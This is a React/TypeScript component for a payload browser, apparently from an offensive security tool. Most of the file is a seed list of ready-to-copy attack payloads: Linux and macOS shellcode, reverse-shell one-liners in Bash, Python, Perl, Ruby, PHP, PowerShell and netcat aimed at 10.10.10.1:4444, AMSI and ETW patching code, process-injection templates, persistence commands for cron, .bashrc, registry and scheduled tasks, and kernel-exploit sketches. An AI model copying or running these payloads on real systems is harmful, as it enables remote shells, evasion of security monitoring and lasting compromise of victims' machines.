import { useState, useMemo } from "react";
import { Copy, ExternalLink, Search, X } from "lucide-react";
import { PayloadDetail } from "./PayloadDetail";

export interface Payload {
  id: string;
  name: string;
  description: string;
  category: "shellcode" | "bypass" | "persistence" | "kernel" | "other";
  platform: string;
  arch: string;
  encoding: string;
  content: string;
}

// Static seed mirroring what the Rust backend inserts
const SEED_PAYLOADS: Payload[] = [
  {
    id: "p001", name: "Linux x64 execve /bin/sh",
    description: "Classic execve shellcode that spawns /bin/sh on Linux amd64",
    category: "shellcode", platform: "linux", arch: "x64", encoding: "raw",
    content: "\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05",
  },
  {
    id: "p002", name: "Linux x64 reverse TCP shell",
    description: "Reverse TCP shell connecting to 127.0.0.1:4444 — replace IP bytes as needed",
    category: "shellcode", platform: "linux", arch: "x64", encoding: "raw",
    content: "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x11\\x5c\\x7f\\x00\\x00\\x01\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
  },
  {
    id: "p003", name: "Linux x64 bind shell port 4444",
    description: "Binds a shell on TCP port 4444 and accepts incoming connections",
    category: "shellcode", platform: "linux", arch: "x64", encoding: "raw",
    content: "\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x01\\x5e\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
  },
  {
    id: "p004", name: "Linux x64 chmod 777 /etc/shadow",
    description: "Calls chmod(2) to make /etc/shadow world-readable",
    category: "shellcode", platform: "linux", arch: "x64", encoding: "raw",
    content: "\\x48\\x31\\xc0\\x50\\x68\\x61\\x64\\x6f\\x77\\x68\\x2f\\x73\\x68\\x61\\x68\\x74\\x63\\x2f\\x65\\x68\\x2f\\x65\\x74\\x63\\x48\\x89\\xe7\\x66\\xbe\\xff\\x01\\xb0\\x5a\\x0f\\x05",
  },
  {
    id: "p005", name: "Linux x86 execve /bin/sh",
    description: "32-bit execve shellcode for legacy x86 Linux targets",
    category: "shellcode", platform: "linux", arch: "x86", encoding: "raw",
    content: "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
  },
  {
    id: "p006", name: "macOS ARM64 execve /bin/sh",
    description: "Apple Silicon (ARM64) execve shellcode for macOS targets",
    category: "shellcode", platform: "macos", arch: "arm64", encoding: "raw",
    content: "\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x03\\x1f\\xaa\\xa8\\x1b\\x80\\xd2\\x21\\x00\\x80\\xd2\\xe1\\x66\\x02\\xa9\\xe0\\x03\\x00\\x91\\x02\\x00\\x80\\xd2\\x01\\x10\\x80\\xd2\\xa8\\x1b\\x80\\xd2\\x01\\x00\\x00\\xd4",
  },
  {
    id: "p007", name: "Windows x64 MessageBox shellcode",
    description: "Pops a MessageBox on Windows x64 via kernel32/user32 — useful as a PoC stub",
    category: "shellcode", platform: "windows", arch: "x64", encoding: "raw",
    content: "\\x48\\x83\\xEC\\x28\\x48\\x83\\xE4\\xF0\\x48\\x8D\\x15\\x66\\x00\\x00\\x00\\x48\\x8D\\x0D\\x52\\x00\\x00\\x00\\xE8\\x9E\\x00\\x00\\x00\\x4C\\x8B\\xF8\\x48\\x8D\\x0D\\x5D\\x00\\x00\\x00\\xFF\\xD0\\x48\\x83\\xC4\\x28\\xC3",
  },
  {
    id: "p030", name: "Bash TCP reverse shell",
    description: "One-liner Bash /dev/tcp reverse shell — replace IP:PORT",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1",
  },
  {
    id: "p031", name: "Python3 reverse shell",
    description: "Python3 subprocess reverse shell with os.dup2 fd redirection",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call(["/bin/sh"])'`,
  },
  {
    id: "p032", name: "Perl reverse shell",
    description: "Perl one-liner reverse shell using Socket module",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: `perl -e 'use Socket;$i="10.10.10.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");'`,
  },
  {
    id: "p033", name: "Ruby reverse shell",
    description: "Ruby one-liner TCP reverse shell",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: "p034", name: "PHP reverse shell",
    description: "PHP exec()-based reverse shell — useful for RCE-to-shell escalation",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: `php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: "p035", name: "PowerShell reverse shell",
    description: "PowerShell TCP reverse shell with encoded command for AV evasion",
    category: "shellcode", platform: "windows", arch: "x64", encoding: "raw",
    content: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length)};$c.Close()"`,
  },
  {
    id: "p036", name: "Netcat traditional",
    description: "Classic netcat reverse shell with -e flag (traditional builds)",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: "nc -e /bin/sh 10.10.10.1 4444",
  },
  {
    id: "p037", name: "Netcat without -e (mkfifo)",
    description: "Netcat reverse shell via named pipe for OpenBSD/ncat builds lacking -e",
    category: "shellcode", platform: "linux", arch: "any", encoding: "raw",
    content: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f",
  },
  {
    id: "p040", name: "AMSI bypass PowerShell reflection",
    description: "Patches amsi.dll AmsiScanBuffer return value to 0 via reflection — defeats PS AMSI",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|ForEach-Object{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}`,
  },
  {
    id: "p041", name: "ETW patching",
    description: "Patches EtwEventWrite to RET immediately, blinding ETW-based detections",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `$ntdll=[Reflection.Assembly]::LoadWithPartialName('ntdll')
$patch=[byte[]](0xC3)
$ptr=[IntPtr]::Zero
# resolve EtwEventWrite via GetProcAddress and write 0xC3 with VirtualProtect
[Runtime.InteropServices.Marshal]::Copy($patch,0,$ptr,1)`,
  },
  {
    id: "p042", name: "PPID spoofing comment",
    description: "Spawns a process with a spoofed parent PID to evade parent-based detection rules",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `# PPID spoofing via UpdateProcThreadAttribute
# 1. OpenProcess(PROCESS_ALL_ACCESS, false, targetPPID)
# 2. InitializeProcThreadAttributeList with 1 attribute
# 3. UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
# 4. CreateProcess with STARTUPINFOEX`,
  },
  {
    id: "p043", name: "Process hollowing template",
    description: "Template for classic process hollowing: create suspended, unmap, write new image",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `# 1. CreateProcess("C:\\Windows\\System32\\svchost.exe", CREATE_SUSPENDED)
# 2. ZwUnmapViewOfSection(hProcess, imageBase)
# 3. VirtualAllocEx at preferred base, size of new image
# 4. WriteProcessMemory headers + sections
# 5. SetThreadContext — update RCX to new EP
# 6. ResumeThread`,
  },
  {
    id: "p044", name: "DLL injection template",
    description: "Classic DLL injection using VirtualAllocEx / WriteProcessMemory / CreateRemoteThread",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `# 1. OpenProcess(PROCESS_ALL_ACCESS, false, pid)
# 2. VirtualAllocEx(hProc, NULL, len(path), MEM_COMMIT, PAGE_READWRITE)
# 3. WriteProcessMemory(hProc, pRemote, dllPath, len(path))
# 4. hThread = CreateRemoteThread(hProc, NULL, 0, &LoadLibraryA, pRemote, 0)
# 5. WaitForSingleObject(hThread, INFINITE)`,
  },
  {
    id: "p045", name: "AMSI bypass — C# memory patch",
    description: "Patches AmsiScanBuffer via P/Invoke to always return AMSI_RESULT_CLEAN",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `// C# AMSI Bypass via P/Invoke memory patch
using System.Runtime.InteropServices;
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
var amsi = GetModuleHandle("amsi.dll");
var scan = GetProcAddress(amsi, "AmsiScanBuffer");
VirtualProtect(scan, 6, 0x40, out uint old);
// mov eax, AMSI_RESULT_CLEAN(1); ret
Marshal.Copy(new byte[]{0xB8,0x01,0x00,0x00,0x00,0xC3}, 0, scan, 6);
VirtualProtect(scan, 6, old, out _);`,
  },
  {
    id: "p046", name: "AMSI bypass — C native patch",
    description: "C implementation patching AmsiScanBuffer with VirtualProtect",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `// C AMSI bypass — inline patch via WinAPI
#include <windows.h>
void patch_amsi(void) {
    HMODULE h = LoadLibraryA("amsi.dll");
    FARPROC fn = GetProcAddress(h, "AmsiScanBuffer");
    DWORD old;
    VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old);
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}; // mov eax,80070057h; ret
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, 6, old, &old);
}`,
  },
  {
    id: "p047", name: "ETW bypass — NtTraceEvent patch C#",
    description: "Patches NtTraceEvent in ntdll to RET, blinding all ETW providers",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `// C# ETW bypass — patch NtTraceEvent via P/Invoke
using System.Runtime.InteropServices;
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
var ntdll = GetModuleHandle("ntdll.dll");
var addr  = GetProcAddress(ntdll, "NtTraceEvent");
VirtualProtect(addr, 1, 0x40, out uint old);
Marshal.WriteByte(addr, 0xC3); // RET
VirtualProtect(addr, 1, old, out _);`,
  },
  {
    id: "p048", name: "ETW bypass — EtwEventWrite patch C",
    description: "C native patch for EtwEventWrite to disable all ETW event logging",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `// C ETW bypass — patch EtwEventWrite in ntdll
#include <windows.h>
void patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(ntdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE *)fn = 0xC3; // RET
    VirtualProtect(fn, 1, old, &old);
}`,
  },
  {
    id: "p049", name: "NtCreateThreadEx injection — C#",
    description: "Stealthier remote thread injection using undocumented NtCreateThreadEx to avoid hook detection",
    category: "bypass", platform: "windows", arch: "x64", encoding: "raw",
    content: `// C# NtCreateThreadEx injection — bypasses CreateRemoteThread hooks
[DllImport("ntdll")] static extern int NtCreateThreadEx(
    out IntPtr hThread, uint access, IntPtr attr, IntPtr hProcess,
    IntPtr startAddr, IntPtr param, bool suspended,
    int stackSize, int maxStack, int disabled, IntPtr attrList);
// Call instead of CreateRemoteThread:
NtCreateThreadEx(out IntPtr t, 0x1FFFFF, IntPtr.Zero, hProcess,
    shellcodeAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);`,
  },
  {
    id: "p050", name: "Linux crontab persistence",
    description: "Adds a cron job for the current user that runs a reverse shell every minute",
    category: "persistence", platform: "linux", arch: "any", encoding: "raw",
    content: "(crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/10.10.10.1/4444 0>&1') | crontab -",
  },
  {
    id: "p051", name: "Linux .bashrc persistence",
    description: "Appends a reverse shell stub to ~/.bashrc for session-based persistence",
    category: "persistence", platform: "linux", arch: "any", encoding: "raw",
    content: "echo 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> ~/.bashrc",
  },
  {
    id: "p052", name: "Windows registry Run key",
    description: "Adds a payload to HKCU\\Run for user-level persistence on next logon",
    category: "persistence", platform: "windows", arch: "x64", encoding: "raw",
    content: `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\Users\\Public\\payload.exe" /f`,
  },
  {
    id: "p053", name: "Windows scheduled task persistence",
    description: "Creates a scheduled task running at logon for system-level persistence",
    category: "persistence", platform: "windows", arch: "x64", encoding: "raw",
    content: `schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\\Users\\Public\\payload.exe" /ru SYSTEM /f`,
  },
  {
    id: "p054", name: "macOS LaunchAgent plist",
    description: "Drops a LaunchAgent plist for user-level persistence across reboots on macOS",
    category: "persistence", platform: "macos", arch: "any", encoding: "raw",
    content: `<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "">
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.update</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>`,
  },
  {
    id: "p060", name: "Dirty COW pattern",
    description: "Race condition write primitive pattern exploiting COW page fault — CVE-2016-5195",
    category: "kernel", platform: "linux", arch: "x64", encoding: "raw",
    content: `// Dirty COW: two racing threads — one madvise(MADV_DONTNEED), one /proc/self/mem write
// 1. mmap target file (PROT_READ)
// 2. Thread A: while(1) madvise(map, len, MADV_DONTNEED)
// 3. Thread B: while(1) pwrite(fd_procmem, data, len, (off_t)map)
// Race collapses the COW protection window enabling write to read-only mapping`,
  },
  {
    id: "p061", name: "ret2usr template",
    description: "Return-to-userspace kernel exploit template for systems without SMEP/SMAP",
    category: "kernel", platform: "linux", arch: "x64", encoding: "raw",
    content: `// ret2usr skeleton
void payload(void) {
    commit_creds(prepare_kernel_cred(0)); // elevate to uid=0
}
// Overwrite RIP with &payload via kernel bug
// On return from kernel mode CPU switches to user CS:RIP`,
  },
  {
    id: "p062", name: "KASLR leak via /proc/kallsyms",
    description: "Reads kernel base address from /proc/kallsyms (requires kptr_restrict=0)",
    category: "kernel", platform: "linux", arch: "x64", encoding: "raw",
    content: `python3 -c "
import re
out = open('/proc/kallsyms').read()
m = re.search(r'([0-9a-f]+) T _text', out)
if m: print('Kernel base:', hex(int(m.group(1), 16)))
"`,
  },
];

// ── Category helpers ──────────────────────────────────────────────────────────

const CATEGORY_COLORS: Record<Payload["category"], string> = {
  shellcode:   "bg-orange-500/20 text-orange-400 border border-orange-500/30",
  bypass:      "bg-red-500/20 text-red-400 border border-red-500/30",
  persistence: "bg-purple-500/20 text-purple-400 border border-purple-500/30",
  kernel:      "bg-yellow-500/20 text-yellow-400 border border-yellow-500/30",
  other:       "bg-gray-500/20 text-gray-400 border border-gray-500/30",
};

const ALL_CATEGORIES = ["all", "shellcode", "bypass", "persistence", "kernel", "other"] as const;
const ALL_PLATFORMS   = ["all", "linux", "windows", "macos", "android", "freebsd"] as const;
const ALL_ARCHS       = ["all", "x64", "x86", "arm64", "arm", "any"] as const;

// ── Main component ────────────────────────────────────────────────────────────

export function PayloadBrowser() {
  const [search, setSearch]     = useState("");
  const [category, setCategory] = useState<string>("all");
  const [platform, setPlatform] = useState<string>("all");
  const [arch, setArch]         = useState<string>("all");
  const [selected, setSelected] = useState<Payload | null>(null);
  const [copied, setCopied]     = useState<string | null>(null);

  const filtered = useMemo(() => {
    const q = search.toLowerCase();
    return SEED_PAYLOADS.filter((p) => {
      if (category !== "all" && p.category !== category) return false;
      if (platform !== "all" && p.platform !== platform) return false;
      if (arch !== "all" && p.arch !== arch && p.arch !== "any") return false;
      if (q && !p.name.toLowerCase().includes(q) && !p.description.toLowerCase().includes(q)) return false;
      return true;
    });
  }, [search, category, platform, arch]);

  const handleCopy = (payload: Payload, e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(payload.content).catch(() => {});
    setCopied(payload.id);
    setTimeout(() => setCopied(null), 1500);
  };

  const handleOpenInEditor = (payload: Payload, e: React.MouseEvent) => {
    e.stopPropagation();
    const lang = payload.platform === "windows" ? "powershell"
      : payload.category === "shellcode" ? "asm"
      : "bash";
    window.dispatchEvent(new CustomEvent("nullforge:open-file", {
      detail: { name: payload.name + ".txt", language: lang, content: payload.content },
    }));
  };

  if (selected) {
    return (
      <PayloadDetail
        payload={selected}
        onClose={() => setSelected(null)}
      />
    );
  }

  return (
    <div className="flex flex-col h-full text-xs">
      {/* Search */}
      <div className="px-2 py-1.5 border-b border-border flex-shrink-0">
        <div className="relative">
          <Search size={11} className="absolute left-2 top-1/2 -translate-y-1/2 text-text-muted pointer-events-none" />
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search payloads..."
            className="w-full bg-elevated border border-border rounded pl-6 pr-2 py-1.5 text-xs text-text-primary placeholder-text-muted focus:outline-none focus:border-accent-red transition-colors"
          />
          {search && (
            <button onClick={() => setSearch("")} className="absolute right-2 top-1/2 -translate-y-1/2 text-text-muted hover:text-text-primary">
              <X size={10} />
            </button>
          )}
        </div>
      </div>

      {/* Filters */}
      <div className="px-2 py-1.5 border-b border-border flex flex-col gap-1 flex-shrink-0">
        <div className="flex gap-1">
          <FilterSelect label="Cat" value={category} onChange={setCategory} options={ALL_CATEGORIES} />
          <FilterSelect label="OS" value={platform} onChange={setPlatform} options={ALL_PLATFORMS} />
        </div>
        <div className="flex gap-1 items-center">
          <FilterSelect label="Arch" value={arch} onChange={setArch} options={ALL_ARCHS} />
          <span className="ml-auto text-text-dim">{filtered.length} results</span>
        </div>
      </div>

      {/* Payload list */}
      <div className="flex-1 overflow-y-auto">
        {filtered.length === 0 ? (
          <div className="flex items-center justify-center h-20 text-text-muted text-xs">
            No payloads match
          </div>
        ) : (
          <div className="divide-y divide-border">
            {filtered.map((p) => (
              <div
                key={p.id}
                onClick={() => setSelected(p)}
                className="px-2 py-2 cursor-pointer hover:bg-elevated transition-colors group"
              >
                <div className="flex items-start justify-between gap-1 mb-1">
                  <span className="text-text-primary font-medium leading-tight line-clamp-2 flex-1">
                    {p.name}
                  </span>
                  <span className={`flex-shrink-0 text-xs px-1 py-0.5 rounded text-[10px] ${CATEGORY_COLORS[p.category]}`}>
                    {p.category}
                  </span>
                </div>
                <div className="text-text-muted line-clamp-1 mb-1.5">{p.description}</div>
                <div className="flex items-center gap-1.5 justify-between">
                  <div className="flex gap-1">
                    <PlatformBadge value={p.platform} />
                    {p.arch !== "any" && <ArchBadge value={p.arch} />}
                  </div>
                  <div className="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                    <ActionButton
                      title="Copy"
                      active={copied === p.id}
                      onClick={(e) => handleCopy(p, e)}
                    >
                      {copied === p.id ? "✓" : <Copy size={10} />}
                    </ActionButton>
                    <ActionButton
                      title="Open in Editor"
                      onClick={(e) => handleOpenInEditor(p, e)}
                    >
                      <ExternalLink size={10} />
                    </ActionButton>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function FilterSelect({
  label, value, onChange, options,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  options: readonly string[];
}) {
  return (
    <div className="flex items-center gap-1 flex-1 min-w-0">
      <span className="text-text-dim flex-shrink-0">{label}</span>
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className="flex-1 min-w-0 bg-elevated border border-border rounded px-1 py-0.5 text-text-muted text-xs focus:outline-none focus:border-accent-red transition-colors appearance-none cursor-pointer"
      >
        {options.map((o) => (
          <option key={o} value={o}>{o}</option>
        ))}
      </select>
    </div>
  );
}

function PlatformBadge({ value }: { value: string }) {
  const colors: Record<string, string> = {
    linux:   "text-green-400",
    windows: "text-blue-400",
    macos:   "text-gray-300",
    web:     "text-cyan-400",
  };
  return (
    <span className={`${colors[value] ?? "text-text-muted"} text-[10px]`}>
      {value}
    </span>
  );
}

function ArchBadge({ value }: { value: string }) {
  return (
    <span className="text-text-dim text-[10px]">{value}</span>
  );
}

function ActionButton({
  children, title, active, onClick,
}: {
  children: React.ReactNode;
  title: string;
  active?: boolean;
  onClick: (e: React.MouseEvent) => void;
}) {
  return (
    <button
      title={title}
      onClick={onClick}
      className={`flex items-center justify-center w-5 h-5 rounded transition-colors ${
        active
          ? "bg-accent-green/20 text-accent-green"
          : "bg-elevated text-text-muted hover:text-text-primary hover:bg-border"
      }`}
    >
      {children}
    </button>
  );
}
